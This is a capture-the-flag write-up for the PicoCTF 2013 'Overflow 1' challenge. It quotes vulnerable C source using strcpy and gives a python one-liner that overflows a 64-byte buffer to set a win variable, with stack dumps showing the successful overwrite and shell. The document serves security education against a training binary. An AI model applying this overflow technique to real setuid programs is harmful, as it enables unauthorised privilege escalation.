# PicoCTF 2013: Overflow 1

**Category:** Binary Exploitation
**Points:** 90
**Description:**

>Stack overflows are the most basic binary exploitation technique, but they
>take a lot of skill to master. If you already know some C, these problems can
>help acquaint you with stacks and binary exploitation in general.

>Problem available on the shell machine in
>/problems/stack_overflow_1_3948d17028101c40 , downloadable [here](https://2013.picoctf.com/problems/overflow1-3948d17028101c40) with source
>[here](https://2013.picoctf.com/problems/overflow1-3948d17028101c40.c).

>If you solve the problem you will be able to read the key file by running

> cat /problems/stack_overflow_1_3948d17028101c40/key

>on the PicoCTF shell machine

>**Hint:**n general, the compiler will put things on the stack in the order
>they appear in the code. Also google 'endianness'

## Write-up

Looking at the source, we can see a few things:
```C
void vuln(int tmp, char *str) {
    int win = tmp;
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 23, (void **) &tmp);
    printf("win = %d\n", win);
    if (win == 1) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Sorry, you lose.\n");
    }
    exit(0);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: stack_overwrite [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(0, argv[1]);
    return 0;
}
```

First, our input is a command line argument to the program. Second, if we can
set the win variable equal to 1, we'll get a shell! Let's dive in.

```
$ ./overflow1-3948d17028101c40 $(python -c 'print "A"*64 + "B"')
Stack dump:
0xffa81994: 0xffa82845 (second argument)
0xffa81990: 0x00000000 (first argument)
0xffa8198c: 0x0804870f (saved eip)
0xffa81988: 0xffa819b8 (saved ebp)
0xffa81984: 0xf779c000
0xffa81980: 0xf76a8a00
0xffa8197c: 0x00000042
0xffa81978: 0x41414141
0xffa81974: 0x41414141
0xffa81970: 0x41414141
0xffa8196c: 0x41414141
0xffa81968: 0x41414141
0xffa81964: 0x41414141
0xffa81960: 0x41414141
0xffa8195c: 0x41414141
0xffa81958: 0x41414141
0xffa81954: 0x41414141
0xffa81950: 0x41414141
0xffa8194c: 0x41414141
0xffa81948: 0x41414141
0xffa81944: 0x41414141
0xffa81940: 0x41414141
0xffa8193c: 0x41414141 (beginning of buffer)
win = 66
Sorry, you lose.
```
You'll see that if we fill up our buffer ("A"\*64) and andd one more letter,
the value of win gets changed. For those of you who don't know, the ascii value
of "B" is 66, meaning we have control over the win variable. All we have to do
is submit a character with an ascii value of 1. Since this isn't printable,
we're going to use escape sequences in python.
```
$ ./overflow1-3948d17028101c40 $(python -c 'print "A"*64 + "\x01"')
Stack dump:
0xff828874: 0xff829848 (second argument)
0xff828870: 0x00000000 (first argument)
0xff82886c: 0x0804870f (saved eip)
0xff828868: 0xff828898 (saved ebp)
0xff828864: 0xf77b7000
0xff828860: 0xf76c3aa7
0xff82885c: 0x00000001
0xff828858: 0x41414141
0xff828854: 0x41414141
0xff828850: 0x41414141
0xff82884c: 0x41414141
0xff828848: 0x41414141
0xff828844: 0x41414141
0xff828840: 0x41414141
0xff82883c: 0x41414141
0xff828838: 0x41414141
0xff828834: 0x41414141
0xff828830: 0x41414141
0xff82882c: 0x41414141
0xff828828: 0x41414141
0xff828824: 0x41414141
0xff828820: 0x41414141
0xff82881c: 0x41414141 (beginning of buffer)
win = 1
$
```

The "\x01" in python is just a way for us to supply a non printable character.


## Other write-ups and resources

* none yet
